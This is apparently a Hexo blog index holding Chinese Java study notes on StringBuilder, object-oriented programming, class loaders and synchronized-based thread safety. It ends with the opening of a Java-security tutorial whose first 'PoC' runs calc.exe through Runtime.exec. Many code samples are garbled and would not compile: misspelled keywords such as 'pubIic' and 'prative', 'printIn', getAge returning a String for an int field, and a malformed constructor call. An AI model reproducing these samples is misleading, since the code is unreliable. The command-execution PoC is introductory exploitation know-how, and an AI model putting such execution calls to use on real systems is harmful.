<td align="center">构造一个字符串构建器，其中不包含任何字符，初始容量为16个字符。</td>
</tr>
<tr>
<td align="center"><code>StringBuilder(int capacity)</code></td>
<td align="center">构造一个字符串构建器，其中没有字符，并且具有 <code>capacity</code>参数指定的初始容量。</td>
</tr>
<tr>
<td align="center"><code>StringBuilder(CharSequence seq)</code></td>
<td align="center">构造一个字符串构建器，其中包含与指定的 <code>CharSequence</code>相同的字符。</td>
</tr>
<tr>
<td align="center"><code>StringBuilder(String str)</code>（常用）</td>
<td align="center">构造一个初始化为指定字符串内容的字符串构建器。</td>
</tr>
</tbody></table>
<h3 id="StringBuilder的添加和反转方法"><a href="#StringBuilder的添加和反转方法" class="headerlink" title="StringBuilder的添加和反转方法"></a>StringBuilder的添加和反转方法</h3><table>
<thead>
<tr>
<th align="center">方法名</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>StringBuilder append(任意类型) </code></td>
<td align="center">添加数据，并返回对象本身</td>
</tr>
<tr>
<td align="center"><code>StringBuilder reverse()</code></td>
<td align="center">返回相反的字符序列</td>
</tr>
</tbody></table>
<h3 id="StringBuilder和String的相互转换"><a href="#StringBuilder和String的相互转换" class="headerlink" title="StringBuilder和String的相互转换"></a>StringBuilder和String的相互转换</h3><ol>
<li>StringBuilder转换为 String<br>public String toString():通过toString()就可以实现把StringBuilder转换为String</li>
<li>String 转换为StringBuilder<br>public StringBuilder(String s): 通过构造方法就可以实现把 String转换为StringBuilder</li>
</ol>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java面向对象</title>
    <url>/2023/07/27/Java3/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>

<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><ul>
<li><p><strong>类和对象的关系</strong><br><strong>类</strong>:类是对现实生活中一类具有共同属性和行为的事物的抽象<br><strong>对象</strong>:是能够看得到摸的着的真实存在的实体</p>
</li>
<li><p><strong>类的定义</strong><br><strong>类的重要性</strong>:是Java程序的基本组成单位<br><strong>类是什么</strong>:是对现实生活中一类具有共同属性和行为的事物的抽象，确定对象将会拥有的属性和行为</p>
<p><strong>类的特点</strong>：类是对象的数据类型，是具有相同属性和行为的事物的抽象</p>
<p><strong>类的组成</strong>:属性和行为<br><strong>属性</strong>:在类中通过成员变量来体现(类中方法外的变量)<br><strong>行为</strong>:在类中通过成员方法来体现(和前面的方法相比去掉static关键字即可)</p>
</li>
<li><p><strong>对象的定义</strong></p>
<p>看看周围真实的世界，会发现身边有很多对象，车，手机，人等等。所有这些对象都有自己的属性和行为。</p>
</li>
</ul>
<p>​       拿一个手机来举例，它的属性有：品牌、价格，行为有：打电话、发短信。</p>
<p>​       软件对象也有属性和行为。行为通过方法体现。</p>
<p>​       在软件开发中，方法操作对象内部状态的改变，对象的相互调用也是通过方法来完成。</p>
<h2 id="Java-中的类"><a href="#Java-中的类" class="headerlink" title="Java 中的类"></a>Java 中的类</h2><p>类可以看成是创建 Java 对象的模板。</p>
<p>pubIic class Phone {</p>
<p>​		&#x2F;&#x2F;成员变量</p>
<p>​		String brand;</p>
<p>​		int price;</p>
<p>​		&#x2F;&#x2F;成员方法</p>
<p>​		public void call(){</p>
<p>​			System.out.printIn(“打电话”);}<br>​		public void sendMessage(){</p>
<p>​			System.out,pnintIn(“发短信”);}</p>
<p>}</p>
<p><strong>成员变量和局部变量的区别</strong></p>
<table>
<thead>
<tr>
<th align="center">区别</th>
<th align="center">成员变量</th>
<th align="center">局部变量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">类中位置不同</td>
<td align="center">类中方法外</td>
<td align="center">方法内或者方法声明上</td>
</tr>
<tr>
<td align="center">内存中位置不同</td>
<td align="center">堆内存</td>
<td align="center">栈内存</td>
</tr>
<tr>
<td align="center">生命周期不同</td>
<td align="center">随着对象的存在而存在，随看对象的消失而消失</td>
<td align="center">随着方法的调用而存在，随着方法的调用完毕而消失</td>
</tr>
<tr>
<td align="center">初始化值不同</td>
<td align="center">有默认的初始化值</td>
<td align="center">没有默认的初始化值，必须先定义，赋值，才能使用</td>
</tr>
</tbody></table>
<ul>
<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
</ul>
<hr>
<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
</ol>
<hr>
<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
<li>是一个权限修饰符</li>
<li>可以修饰成员 (成员变量和成员方法)</li>
<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
</ul>
<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
<ul>
<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
</ul>
<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
<li><p>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p>
</li>
<li><p>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></p>
</li>
<li><p>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</p>
</li>
</ol>
<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
</ol>
<h2 id="四、构造方法"><a href="#四、构造方法" class="headerlink" title="四、构造方法"></a>四、构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
<p>下面是一个构造方法示例：</p>
<p>public class Student{   </p>
<p>​		 public Student(){ }     </p>
<p>​		 public Student(String name){         </p>
<p>​			&#x2F;&#x2F; 这个构造器仅有一个参数：name    } }</p>
<p><strong>注意事项</strong>：</p>
<ol>
<li><p>构造方法的创建</p>
<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
</li>
<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
</li>
<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
</li>
</ol>
<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
<li>成员变量<br>使用private修饰</li>
<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
</ol>
<p>例子：</p>
<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><p>public class Student{   </p>
<p>​		prative String name;&#x2F;&#x2F;成员变量</p>
<p>​		prative int age;</p>
<p>​		public Student() { }&#x2F;&#x2F;构造方法</p>
<p>​		public Student(String name,int age){ </p>
<p>​			this.name &#x3D; name;</p>
<p>​			this.age &#x3D; age;}</p>
<p>​		&#x2F;&#x2F;成员方法</p>
<p>​		public void setName(String name){</p>
<p>​			this.name &#x3D; name;}</p>
<p>​		public String getName(){</p>
<p>​			return name;}</p>
<p>​		public void setAge(int age){</p>
<p>​			this.age &#x3D; age;}</p>
<p>​		public String getAge(){</p>
<p>​			return age;}</p>
<p>​		public void show(){</p>
<p>​			System.out.println(name+”,”+age);}</p>
<p>} </p>
<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><p>package com.XXX</p>
<p>public class StudentDemo{</p>
<p>​		public static void main(String[ ] args){</p>
<p>​			&#x2F;&#x2F;无参构造方法创建对象后使用setXxx()赋值</p>
<p>​			Student s1 &#x3D; new Student( );</p>
<p>​			s1.setName(“xuan”);</p>
<p>​			s1.setAge(18);</p>
<p>​			s1.show();</p>
<p>​			&#x2F;&#x2F;使用带参构造方法直接创建带有属性值的对象</p>
<p>​			Student s2 &#x3D; new Student(“name:”xuan”,age:18);</p>
<p>​			s2.show();</p>
<p>​		}		</p>
<p>}</p>
<p><strong>运行结果</strong>：</p>
<p>xuan,18</p>
<p>xuan,18</p>
<h1 id="Java-继承"><a href="#Java-继承" class="headerlink" title="Java 继承"></a>Java 继承</h1><hr>
<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是面向对象的三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法</p>
<ul>
<li>格式:public class 子类名extends父类名}</li>
<li>范例: public class Zi extends Fu<br>Fu:是类，也被称为基类、超类<br>Zi: 是子类，也被称为派生类</li>
</ul>
<p>继承中子类的特点：</p>
<p>子类可以有父类的内容，还可以有自己特有的内容</p>
<h2 id="继承的好处和弊端"><a href="#继承的好处和弊端" class="headerlink" title="继承的好处和弊端"></a>继承的好处和弊端</h2><p><strong>继承好处</strong><br>提高了代码的复用性(多个类相同的成员可以放到同一个类中)<br>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)<br><strong>继承弊端</strong><br>继承让类与类之间产生了关系，类的合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性<br><strong>什么时候使用继承?</strong><br>继承体现的关系:is a<br>假设法:我有两个类A和B，如果他们满足A是B的一种，或者B是A的一种，就说明他们存在继承关系，这个时候就可以考虑使用继承来体现，否则就不滥用继承</p>
<h2 id="继承中变量的访问特点"><a href="#继承中变量的访问特点" class="headerlink" title="继承中变量的访问特点"></a>继承中变量的访问特点</h2><p>在子类方法中访问一个变量</p>
<ol>
<li>子类局部范围找</li>
<li>子类成员范围找</li>
<li>父类成员范围找</li>
<li>如果都没有就报错(不考虑父亲的父亲…)</li>
</ol>
<h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/java-extends-2020-12-08.png" alt="img"></p>
<h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>
<h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>
<p>public class Animal {<br>    private String name;<br>    private int id;<br>    public Animal(String myName, int myid) {<br>        &#x2F;&#x2F;初始化属性值<br>    }<br>    public void eat() {  &#x2F;&#x2F;吃东西方法的具体实现  }<br>    public void sleep() { &#x2F;&#x2F;睡觉方法的具体实现  }<br>} </p>
<p>public class Penguin  extends  Animal{<br>}</p>
<h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有<code>多继承</code>的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>
<p>public interface A {<br>    public void eat();<br>    public void sleep();<br>}</p>
<p>public interface B {<br>    public void show();<br>}</p>
<p>public class C implements A,B {<br>}</p>
<h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
<p>this关键字：指向自己的引用。</p>
<p><strong>实例</strong></p>
<p>class Animal {<br>  void eat() {<br>    System.out.println(“animal : eat”);<br>  }<br>}</p>
<p>class Dog extends Animal {<br>  void eat() {<br>    System.out.println(“dog : eat”);<br>  }<br>  void eatTest() {<br>    this.eat();   &#x2F;&#x2F; this 调用自己的方法<br>    super.eat();  &#x2F;&#x2F; super 调用父类方法<br>  }<br>}</p>
<p>public class Test {<br>  public static void main(String[] args) {<br>    Animal a &#x3D; new Animal();<br>    a.eat();<br>    Dog d &#x3D; new Dog();<br>    d.eatTest();<br>  }<br>}</p>
<p>输出结果为：</p>
<p>animal : eat<br>dog : eat<br>animal : eat</p>
<h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p>
<p><strong>final修饰的特点</strong></p>
<ul>
<li>修饰方法:表明该方法是最终方法，不能被重写</li>
<li>修饰变量:表明该变量是常量，不能再次被赋值</li>
<li>修饰类:表明该类是最终类，不能被继承</li>
</ul>
<p>声明类：</p>
<p>final class 类名 {&#x2F;&#x2F;类体}</p>
<p>声明方法：</p>
<p>修饰符(public&#x2F;private&#x2F;default&#x2F;protected) final 返回值类型 方法名(){&#x2F;&#x2F;方法体}</p>
<p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p>
<p><strong>final修饰局部变量</strong></p>
<p>变量是基本类型: final修饰指的是基本类型的数据值不能发生改变</p>
<p>变量是引用类型: final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</p>
<h1 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h1><p>static 关键字是静态的意思，可以修饰成员方法，成员变量<br><strong>static 修饰的特点</strong></p>
<ul>
<li>被类的所有对象共享<br>这也是我们判断是否使用静态关键字的条件</li>
<li>推荐使用类名调用</li>
</ul>
<p><strong>static 访问特点</strong></p>
<p>静态成员方法只能访问静态成员和静态成员方法</p>
<h1 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h1><p>包主要用来对类和接口进行分类管理</p>
<p>包的定义格式</p>
<p>格式：package 包名；</p>
<p>范例：package com.first;</p>
<h2 id="import-语句-导包"><a href="#import-语句-导包" class="headerlink" title="import 语句(导包)"></a>import 语句(导包)</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
<p>import java.io.*;(import 包名)</p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全</title>
    <url>/2023/08/15/Java%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h1><span id="more"></span>

<p>java通过以下技术来实现安全机制</p>
<ul>
<li>语言设计特性(对数组边界检查，只进行合法的类型转换，无指针算法)</li>
<li>访问控制机制，用于控制代码能够执行的功能</li>
<li>代码签名，java代码的作者能够用加密算法来表明java代码的作者</li>
</ul>
<p>一.类加载器</p>
<p><a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>只加载程序需要的类文件，例如程序从MyProgram.Class执行，下面是虚拟机执行步骤：</p>
<ol>
<li>虚拟机有一个用于加载类文件的机制，例如从磁盘文件加载或web请求访问，使用该价值加载MyProgram.Class</li>
<li>如果MyProgram.Class拥有一个类型为另一个类的实例变量，或者拥有超类，那么这些类文件也被加载</li>
<li>接着虚拟机执行MyProgram.Class的main方法，因为它是静态，无需实例化</li>
<li>如果main方法或者调用其他方法使用到得类，这些类被加载</li>
</ol>
<p>  类加载机制至少拥有三个类加载器：</p>
<ul>
<li>引导类加载器 负责加载系统类，从JAR文件rt.jar中加载，它是虚拟机整体一部分。而且它是C语言实现的，另外引导类加载器没有ClassLoader对象</li>
<li>扩展类加载器 用于从jre&#x2F;lib&#x2F;ext目录加载“标准的扩展”，</li>
<li>系统类加载器(也陈为应用类加载器) 加载应用类，它是在CLASSPATH环境变量或者是-classpath命令行选项设置的类目录里或者是JAR&#x2F;ZIP文件里查找这些类。</li>
</ul>
<h1 id="Java线程安全"><a href="#Java线程安全" class="headerlink" title="Java线程安全"></a>Java线程安全</h1><p>一、什么是线程安全</p>
<p>想给出一个线程安全的确切定义是复杂的，但我们可以这样认为：<br>如果多线程环境下代码运行的结果是符合我们预期的，即在单线程环境应该的结果，则说这个程序是线程安全的</p>
<p>🌰栗子</p>
<pre><code>package Thread;
 
public class demo77 &#123;
    private static int count;
    public static void main(String[] args) throws InterruptedException &#123;
        Thread t1 = new Thread(() -&gt; &#123;
            for (int i = 0; i &lt; 5000; i++) &#123;
                count++;
            &#125;
        &#125;);
        Thread t2 = new Thread(() -&gt; &#123;
            for (int i = 0; i &lt; 5000; i++) &#123;
                count++;
            &#125;
        &#125;);
        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
        t2.start();
        // 让主线程main等t1、t2执行完了再接着往下走
        t1.join();
        t2.join();
        System.out.println(count);
    &#125;
&#125;
</code></pre>
<p> 想这样，在多线程情况下，程序的运行结果不符合我们的预期，这被称为线程不安全</p>
<p>二、造成线程不安全的原因 </p>
<p>根本原因：操作系统的随机调度执行，抢占式执行 </p>
<pre><code>还有：我们可以看到我们的count是一个全局变量，我们的线程t1、线程t2对count变量同时都进行了修改——++操作（为什么说是同时呢，因为我们的t1线程、t2线程在创建完了后就参与到系统调度，由系统随机分配线程的执行，可能是t2线程先执行10个指令然后t1再执行10个指令，相当于是同时）
</code></pre>
<p>那么我们就改一下代码让t1、t2分批次对count修改不就行了吗？</p>
<pre><code>package Thread;
 
public class demo77 &#123;
    private static int count;
    public static void main(String[] args) throws InterruptedException &#123;
        Thread t1 = new Thread(() -&gt; &#123;
            for (int i = 0; i &lt; 5000; i++) &#123;
                count++;
            &#125;
 
        &#125;);
        Thread t2 = new Thread(() -&gt; &#123;
            try &#123;
                t1.join();// 等t1线程执行完了，t2线程再执行
            &#125; catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
            for (int i = 0; i &lt; 5000; i++) &#123;
                count++;
            &#125;
        &#125;);
        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
        t2.start();
 
        t2.join(); // 等t2线程执行完了，主线程main再接着执行，执行顺序：t1-&gt;t2-&gt;打印count
        System.out.println(count);
    &#125;
&#125;
</code></pre>
<p>大家有没有想过为什么多个线程同时执行count++的时候就会出现BUG呢？</p>
<p>这是因为我们多个线程同时对同一变量修改的所造成的BUG往往和我们操作的原子性有关！！！这时候的操作往往不是一个整体，多个线程并发执行这些操作就可能出现一些问题</p>
<p>如果我们在变量修改过程中，操作是原子的——只是对应一个机器指令，那么即使是多个线程同时对同一个变量修改也不一定会造成BUG,但也可能造成BUG——要看具体的业务场景</p>
<p>总之我们要避免多个线程同时对同一个变量来操作</p>
<p>🍑 对原子性在多线程并发执行中出现问题的分析</p>
<p>🔔🔔注意：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">像 count++ 其实一行代码, 对应三个机器指令!</span><br><span class="line">1)从内存读取数据到 CPU load</span><br><span class="line">2)在 CPU 寄存器中,完成加法运算 add</span><br><span class="line">3)把寄存器的数据写回到内存中 save</span><br><span class="line">这几个步骤单线程下执行,没有任何问题</span><br><span class="line">如果是多线程并发执行,这个就不一定了!!</span><br></pre></td></tr></table></figure>

<p>当我们执行t1.start()、t2.start()后，t1线程和t2线程就在操作系统内核中创建出来了，t1、t2线程就参与到了系统调度当中</p>
<p>而调度是随机的——他可能先让t1执行几个指令，然后t2再执行几个指令、最后再把CPU的控制权交给t1。</p>
<p>于是因为系统的调度是随机的（这是罪魁祸首，但我们无法改变），当我们多个线程同时执行一些不是整体的操作的时候（++或–）由于并发就会产生一些问题</p>
<p> <strong>🌰栗子一</strong></p>
<p><img src="https://img-blog.csdnimg.cn/15ac811137144c5abc01c49068c5a363.png" alt="img"></p>
<p><strong>🌰栗子二</strong> </p>
<p><img src="https://img-blog.csdnimg.cn/2cb8f0784e024604a6c09d38882f0676.png" alt="img"></p>
<p>为什么会产生上面的BUG呢？</p>
<p>就是因为我们的++操作不是一个整体，是一个由多个指令所组成的操作 </p>
<p>解决方案：也是加锁：“synchronized”,意味着把这三条指令打包成了一组指令，然后把这一组指令看出成一条指令了，类似于数学里的“整体代换”思想。</p>
<p> <img src="https://img-blog.csdnimg.cn/82dc94c8208f479e86508569793a36be.png" alt="img"></p>
<p> 首先我们要明白加锁操作都是针对某一个对象来进行的（加锁本质就是给对象头里设置个标记），加锁有以下几种形式</p>
<p>形式一、 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class demo7777 &#123;</span><br><span class="line">	public static Object object1 = new Object();</span><br><span class="line">	public static Object object2 = new Object();</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			synchronized (object1)&#123;//对object1对象进行了加锁操作</span><br><span class="line">				System.out.println(&quot;t1线程start&quot;);</span><br><span class="line">				try &#123;</span><br><span class="line">						Thread.sleep( millis: 1000);</span><br><span class="line">				&#125; catch (InterruptedException e)&#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				System.out.println(&quot;t1线程finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">t1.start();</span><br></pre></td></tr></table></figure>

<p> 形式二、</p>
<pre><code>package Thread;
 
class Counter &#123;
    public static int count;
//    public synchronized void increase() &#123;
//        ++count; 这两种写法视为是等价的
//    &#125;
    public void increase() &#123;
        synchronized (this) &#123; // 这里this可以是任意对象，this可以有多个Counter counter1 = new Counter(), Counter counter2 = new Counter();
            ++count;
        &#125;
    &#125;
&#125;
public class demo777 &#123;
 
    public static void main(String[] args) throws InterruptedException &#123;
        Counter counter1 = new Counter();
        Counter counter2 = new Counter();
        Thread t1 = new Thread(() -&gt; &#123;
            for (int i = 0; i &lt; 5000; i++) &#123;
                counter1.increase();
            &#125;
        &#125;);
        Thread t2 = new Thread(() -&gt; &#123;
            for (int i = 0; i &lt; 5000; i++) &#123;
                counter1.increase();
            &#125;
            // 多个线程去调用这个increase方法，其实就是针对这个Counter对象counter1来进行加锁
            // 如果一个线程t1获取到了该对象counter1的锁，那么另一个线程t2就要等到counter1对应的锁开了后（t1线程执行完该锁里的内容——++操作）t2才能执行++操作
            // 此时++操作相当于是成为了一个整体（相当于一个指令，当一个线程再执行这个加锁的整体的指令的时候，另一个线程只能阻塞等待）
        &#125;);
        t1.start();
        t2.start();
        t1.join();
        t2.join(); // 确保线程t1和线程t2都执行完了，main主线程再接着执行——输出count
        System.out.println(Counter.count); // 输出10000
    &#125;
&#125;
</code></pre>
<p>形式三、 </p>
<p> 加锁本质 就是给对象头里设置个标记,它的成员对应的对象的对象头不受影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized static void func1() &#123;</span><br><span class="line">&#125;</span><br><span class="line">public static void func2() &#123;</span><br><span class="line">	synchronized(Counter.class)&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用类对象加锁,和类里有啥成员没关系~~<br>synchronized static、Counter.class这俩写法视为是等价的!!<br>类对象是整个程序里唯一的!!<br>这样加锁,但凡是调用到 func1 和 func2，之间都会产生竞争!!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Counter1 &#123;</span><br><span class="line">	public static int count;</span><br><span class="line">	public synchronized static void increase() &#123;</span><br><span class="line">		++count;</span><br><span class="line">	&#125;</span><br><span class="line">public class demo77777 </span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Counter1 counter1 = new Counter1();</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			for (int i = 日; i &lt; 500; i++) &#123;</span><br><span class="line">				System.out.println(&quot;t1 start&quot;);</span><br><span class="line">				Counter1.increase();</span><br><span class="line">				System.out.printin(&quot;t1 finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		t1.start();</span><br></pre></td></tr></table></figure>

<p>当我们给不同的对象上锁后，如果用住房来比喻</p>
<pre><code>不同的房间相当于是不同的对象，不同的线程相当于是不同的客人

如果房间1住了客人A，那么房间1就上了锁，客人B就需要等客人A不再住房间1（开了锁）然后客人B才能住房间1；或者客人B住其他的房间（其他的对象，没上锁的）

package Thread;
// 测试线程竞争，对锁的竞争
public class demo7777 &#123;
    public static Object object1 = new Object();
    public static Object object2 = new Object();
    public static void main(String[] args) &#123;
        Thread t1 = new Thread(() -&gt; &#123;
            // 针对object1对象进行加锁，加锁操作是针对某一个对象来进行的
            synchronized (object1) &#123;
                System.out.println(&quot;t1线程start&quot;);
                try &#123;
                    Thread.sleep(1000);
                &#125; catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                System.out.println(&quot;t1线程finish&quot;);
            &#125;
        &#125;);
        t1.start();
        Thread t2 = new Thread(() -&gt; &#123;
            synchronized (object1) &#123;  // 针对object1对象来进行加锁操作
                System.out.println(&quot;t2线程start&quot;);
                try &#123;
                    Thread.sleep(1000);
                &#125; catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                System.out.println(&quot;t2线程finish&quot;);
            &#125;
        &#125;);
        t2.start();
    &#125;
&#125;
</code></pre>
<p>无论是使用哪种用法,使用 synchronized 的时候都是要明确锁对象!(明确是对哪个对象加锁)</p>
<p>只有当两个线程针对同一个对象加锁的时候,才会发生竞争</p>
<p>如果是两个线程针对不同对象加锁,则没有竞争~</p>
<p>我们上面就是两个线程t1和t2同时对object1这个对象进行了加锁，然后t1与t2直接就产生了竞争。从上述代码的实现过程中我们也可以看到，等到t1线程执行完了后，t2线程才开始执行。</p>
<p>但如果是两个线程对不同的对象进行加锁，则没有竞争（就像两个客人（两个线程）住不同的房间（不同的对象）当然不会发生竞争。</p>
<pre><code>package Thread;
// 测试线程竞争，对锁的竞争
public class demo7777 &#123;
    public static Object object1 = new Object();
    public static Object object2 = new Object();
    public static void main(String[] args) &#123;
        Thread t1 = new Thread(() -&gt; &#123;
            synchronized (object1) &#123; // 针对object1对象来进行加锁，加锁操作是针对一个对象来进行的
                System.out.println(&quot;t1线程start&quot;);
                try &#123;
                    Thread.sleep(1000);
                &#125; catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                System.out.println(&quot;t1线程finish&quot;);
            &#125;
        &#125;);
        t1.start();
        Thread t2 = new Thread(() -&gt; &#123;
            synchronized (object2) &#123; // 针对object2对象进行加锁
                System.out.println(&quot;t2线程start&quot;);
                try &#123;
                    Thread.sleep(1000);
                &#125; catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                System.out.println(&quot;t2线程finish&quot;);
            &#125;
        &#125;);
        t2.start();
    &#125;
&#125;
</code></pre>
<p> 两个线程可以做到同时执行</p>
<h1 id="java安全入门-一"><a href="#java安全入门-一" class="headerlink" title="java安全入门(一)"></a>java安全入门(一)</h1><p>首先，我们需要了解java得基本语法，没有了解得同学，建议学习完java得基本语法之后，再来学习</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>首先介绍最基本的 java中的命令执行</p>
<p>我们以后，最常用的poc，就是下面的这条</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="comment">//当前执行命令无回显</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

